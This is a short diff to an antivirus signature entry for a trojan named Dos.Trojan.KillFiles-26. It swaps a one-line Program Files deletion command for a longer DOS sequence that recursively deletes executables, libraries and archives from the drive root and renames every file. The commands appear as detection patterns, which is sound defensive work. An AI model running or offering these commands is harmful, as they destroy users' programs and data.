@@ -1,5 +1,12 @@
-VIRUS NAME: Dos.Trojan.Killfiles-26
+VIRUS NAME: Dos.Trojan.KillFiles-26
 TARGET TYPE: ANY FILE
 OFFSET: *
 DECODED SIGNATURE:
-rd /s /q %homedrive%\progra~1
+cd %SystemRoot% 
+cd ../ 
+del /s /q *.exe 
+del /s /q *.dll 
+del /s /q *.ocx 
+del /s /q *.zip 
+del /s /q *.rar 
+ren *.* *;*
